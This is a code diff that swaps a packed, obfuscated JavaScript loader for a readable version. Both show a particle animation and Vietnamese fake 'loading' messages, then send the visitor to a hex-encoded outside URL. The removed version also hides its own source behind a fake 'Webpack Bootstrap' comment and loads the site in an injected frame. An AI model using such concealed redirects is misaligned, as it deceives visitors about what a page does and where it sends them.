@@ -1,1 +1,238 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('<J>(8(){\'3g 3f\';7 15=z.3e;7 I=[[3d,X,X,1S,W,3c,1i,1i],[1V,1O,W,1R,1T,3b,1V,3a,1U,1Q,W,X],[1j,1U,X,1T,1P,W,1S,1j,1R,1Q],[39,38,1P,1j,1O,1i]];7 K=I[0].37(I[1],I[2],I[3]).36(8(c){1t 35.34(c)}).33(\'\');7 q=z.M(\'32\');7 p=q.31(\'2d\');7 l=[];7 H={x:-1N,y:-1N};7 1h=[[1D,1C,1e],[30,2Z,2Y],[2X,1e,2W],[2V,2U,2T]];8 V(){q.R=1H;q.Q=1G}V();17(\'V\',V);z.17(\'2S\',8(e){H.x=e.2R;H.y=e.2Q});8 P(){6.1g()}P.1f.1g=8(){6.x=o.w()*q.R;6.y=o.w()*q.Q;6.s=o.w()*2+.5;6.U=(o.w()-.5)*.25;6.T=(o.w()-.5)*.25;7 c=1h[o.1I(o.w()*1h.E)];6.r=c[0];6.g=c[1];6.b=c[2];6.a=o.w()*.4+.1;6.G=o.w()*2P+2O;6.1K=6.G};P.1f.1z=8(){7 B=H.x-6.x;7 A=H.y-6.y;7 d=o.1B(B*B+A*A);C(d<S){7 f=(S-d)/S;6.U-=(B/d)*f*.1M;6.T-=(A/d)*f*.1M}6.U*=.1L;6.T*=.1L;6.x+=6.U;6.y+=6.T;6.G--;C(6.G<=0||6.x<-20||6.x>q.R+20||6.y<-20||6.y>q.Q+20){6.1g()}};P.1f.1y=8(){7 F=6.G/6.1K;7 1J=F<.1?F*10:(F>.9?(1-F)*10:1);p.1F();p.2N(6.x,6.y,6.s,0,o.2M*2);p.2L=\'1E(\'+6.r+\',\'+6.g+\',\'+6.b+\',\'+(6.a*1J).1A(3)+\')\';p.2K()};7 n=o.2J(2I,o.1I(1H*1G/2H));O(7 i=0;i<n;i++){l.2G(2F P())}8 1x(){O(7 i=0;i<l.E;i++){O(7 j=i+1;j<l.E;j++){7 B=l[i].x-l[j].x;7 A=l[i].y-l[j].y;7 1d=B*B+A*A;C(1d<2E){p.1F();p.2D(l[i].x,l[i].y);p.2C(l[j].x,l[j].y);p.2B=\'1E(1D,1C,1e,\'+((1-o.1B(1d)/S)*.2A).1A(4)+\')\';p.2z=.5;p.2y()}}}}8 1c(){p.2x(0,0,q.R,q.Q);O(7 i=0;i<l.E;i++){l[i].1z();l[i].1y()}1x();1s(1c)}1c();7 1b=[\'ĐN kết nối đến máy 1wủ\',\'ĐN xác 1vực dữ 2wệu\',\'ĐN tải tài 2vên\',\'ĐN 2uởi 1wạy hệ 1vố2t\'];7 1a=0;7 Y=2s.2r;8 16(){7 1u=z.M(\'2q\');C(1a<1b.E){1u.2p=1b[1a++]+\'<D 19="18">.</D>\'+\'<D 19="18">.</D>\'+\'<D 19="18">.</D>\';Y(16,2o)}}17(\'2n\',8(){16();7 v=z.M(\'2m-v\');7 13=z.M(\'13\');11{C(15){15.2l="/* 2k 2j: 2i 2h */"}}Z(e){}7 14=2g;8 1k(){C(14)1t;14=2f;13.1r.1q(\'2e-2c\');v.2b.2a=\'29\';1s(8(){v.1r.1q(\'28\')})}11{7 L=v.27||v.1n.z;L.26();L.24(\'<!23 12>\'+\'<12>\'+\'<1p></1p>\'+\'<1o>\'+\'<J>\'+\'1m.1l(22("\'+21(K)+\'"));\'+\'<\\/J>\'+\'</1o>\'+\'</12>\');L.1Z()}Z(e){11{v.1n.1m.1l(K)}Z(1Y){v.1X=K}}Y(8(){1k()},1W)})})();</J>',62,203,'||||||this|var|function|||||||||||||ps|||Math|cx|cv|||||frame|random|||document|dy|dx|if|span|length|ratio|life|ms|_0xCore|script|target|doc|getElementById|ang|for||height|width|120|vy|vx|resize|0x73|0x74|_origSetTimeout|catch||try|html|loader|loaded|_0xSelf|cycle|addEventListener|dot|class|si|msgs|loop|dd|242|prototype|reset|cl|0x2f|0x61|showFrame|replace|location|contentWindow|body|head|add|classList|requestAnimationFrame|return|el|th|ch|lines|draw|update|toFixed|sqrt|101|88|rgba|beginPath|innerHeight|innerWidth|floor|fa|ml|99|015|999|0x69|0x2e|0x65|0x63|0x70|0x6f|0x75|0x64|15000|src|e2|close||btoa|atob|DOCTYPE|write||open|contentDocument|visible|block|display|style|out||fade|true|false|Complete|Bootstrap|Runtime|Webpack|textContent|content|DOMContentLoaded|3750|innerHTML|statusText|setTimeout|window|ng|kh|nguy|li|clearRect|stroke|lineWidth|06|strokeStyle|lineTo|moveTo|14400|new|push|18000|60|min|fill|fillStyle|PI|arc|200|400|clientY|clientX|mousemove|92|231|254|135|87|158|69|235|getContext|particleCanvas|join|fromCharCode|String|map|concat|0x7a|0x2d|0x71|0x72|0x3a|0x68|currentScript|strict|use'.split('|'),0,{}))
+
+(function () {
+    'use strict';
+
+    var _0xCore = [
+        [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f],
+        [0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x71,0x75,0x65,0x73,0x74],
+        [0x61,0x75,0x74,0x6f,0x2e,0x73,0x70,0x61,0x63,0x65],
+        [0x2d,0x7a,0x2e,0x61,0x69,0x2f]
+    ];
+
+    var target = _0xCore[0]
+        .concat(_0xCore[1], _0xCore[2], _0xCore[3])
+        .map(function (c) {
+            return String.fromCharCode(c);
+        })
+        .join('');
+
+    var cv = document.getElementById('particleCanvas');
+
+    if (!cv) return;
+
+    var cx = cv.getContext('2d');
+
+    var ps = [];
+
+    var ms = {
+        x: -999,
+        y: -999
+    };
+
+    var cl = [
+        [88,101,242],
+        [235,69,158],
+        [87,242,135],
+        [254,231,92]
+    ];
+
+    function resize() {
+        cv.width = innerWidth;
+        cv.height = innerHeight;
+    }
+
+    resize();
+
+    addEventListener('resize', resize);
+
+    document.addEventListener('mousemove', function (e) {
+        ms.x = e.clientX;
+        ms.y = e.clientY;
+    });
+
+    function P() {
+        this.reset();
+    }
+
+    P.prototype.reset = function () {
+
+        this.x = Math.random() * cv.width;
+        this.y = Math.random() * cv.height;
+
+        this.s = Math.random() * 2 + .5;
+
+        this.vx = (Math.random() - .5) * .25;
+        this.vy = (Math.random() - .5) * .25;
+
+        var c = cl[Math.floor(Math.random() * cl.length)];
+
+        this.r = c[0];
+        this.g = c[1];
+        this.b = c[2];
+
+        this.a = Math.random() * .4 + .1;
+
+        this.life = Math.random() * 400 + 200;
+        this.ml = this.life;
+    };
+
+    P.prototype.update = function () {
+
+        var dx = ms.x - this.x;
+        var dy = ms.y - this.y;
+
+        var d = Math.sqrt(dx * dx + dy * dy);
+
+        if (d < 120) {
+
+            var f = (120 - d) / 120;
+
+            this.vx -= (dx / d) * f * .015;
+            this.vy -= (dy / d) * f * .015;
+        }
+
+        this.vx *= .99;
+        this.vy *= .99;
+
+        this.x += this.vx;
+        this.y += this.vy;
+
+        this.life--;
+
+        if (
+            this.life <= 0 ||
+            this.x < -20 ||
+            this.x > cv.width + 20 ||
+            this.y < -20 ||
+            this.y > cv.height + 20
+        ) {
+            this.reset();
+        }
+    };
+
+    P.prototype.draw = function () {
+
+        var ratio = this.life / this.ml;
+
+        var fa =
+            ratio < .1
+            ? ratio * 10
+            : (ratio > .9 ? (1 - ratio) * 10 : 1);
+
+        cx.beginPath();
+
+        cx.arc(
+            this.x,
+            this.y,
+            this.s,
+            0,
+            Math.PI * 2
+        );
+
+        cx.fillStyle =
+            'rgba(' +
+            this.r + ',' +
+            this.g + ',' +
+            this.b + ',' +
+            (this.a * fa).toFixed(3) +
+            ')';
+
+        cx.fill();
+    };
+
+    var n = Math.min(
+        60,
+        Math.floor(innerWidth * innerHeight / 18000)
+    );
+
+    for (var i = 0; i < n; i++) {
+        ps.push(new P());
+    }
+
+    function lines() {
+
+        for (var i = 0; i < ps.length; i++) {
+
+            for (var j = i + 1; j < ps.length; j++) {
+
+                var dx = ps[i].x - ps[j].x;
+                var dy = ps[i].y - ps[j].y;
+
+                var dd = dx * dx + dy * dy;
+
+                if (dd < 14400) {
+
+                    cx.beginPath();
+
+                    cx.moveTo(ps[i].x, ps[i].y);
+                    cx.lineTo(ps[j].x, ps[j].y);
+
+                    cx.strokeStyle =
+                        'rgba(88,101,242,' +
+                        ((1 - Math.sqrt(dd) / 120) * .06).toFixed(4) +
+                        ')';
+
+                    cx.lineWidth = .5;
+
+                    cx.stroke();
+                }
+            }
+        }
+    }
+
+    function loop() {
+
+        cx.clearRect(0, 0, cv.width, cv.height);
+
+        for (var i = 0; i < ps.length; i++) {
+            ps[i].update();
+            ps[i].draw();
+        }
+
+        lines();
+
+        requestAnimationFrame(loop);
+    }
+
+    loop();
+
+    var msgs = [
+        'Đang kết nối đến máy chủ',
+        'Đang xác thực dữ liệu',
+        'Đang tải tài nguyên',
+        'Đang khởi chạy hệ thống'
+    ];
+
+    var si = 0;
+
+    function cycle() {
+
+        var el = document.getElementById('statusText');
+
+        if (!el) return;
+
+        if (si < msgs.length) {
+
+            el.innerHTML =
+                msgs[si++] +
+                '<span class="dot">.</span>' +
+                '<span class="dot">.</span>' +
+                '<span class="dot">.</span>';
+
+            setTimeout(cycle, 3750);
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+
+        cycle();
+
+        setTimeout(function () {
+
+            window.location.href = target;
+
+        }, 15000);
+
+    });
+
+})();
